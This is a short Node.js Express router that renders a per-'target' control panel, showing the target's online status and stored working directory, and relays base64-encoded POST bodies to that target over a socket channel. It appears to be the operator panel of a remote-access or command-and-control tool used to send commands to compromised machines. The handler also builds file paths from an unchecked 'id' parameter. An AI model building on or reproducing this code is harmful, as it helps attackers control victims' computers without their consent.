const express = require("express")
const fs = require("fs")
const router = express.Router()
const path = require("path")
const { ckeckOnlineTarget, base64Encoder } = require("../utils/server-helpers")

router.route("/").get((req, res) => {
    const { id } = req.query

    if (id == undefined || id.length == 0) {
        res.send("ID NOT FOUND")
        return
    }

    const tarPath = path.join(process.__dirname, "public", "uploads", id)
    if (!fs.existsSync(tarPath)) {
        res.send("ID NOT FOUND")
        return
    }

    const cwd = path.join(process.__dirname, "public", "uploads", id, "cwd")
    if (!fs.existsSync(cwd)) {
        fs.writeFileSync(cwd, "CWD")
    }

    const locationPath = fs.readFileSync(cwd, "utf-8")
    res.render("panel", {
        id,
        locationPath,
        online: ckeckOnlineTarget(id),
    })
}).post((req, res) => {
    const { id } = req.query

    if (ckeckOnlineTarget(id)) {
        IO.emit(`to-${id}`, base64Encoder(req.body))
        res.send("OK")
    } else {
        res.send({ type: "error", message: "target offline" })
    }
})

module.exports = router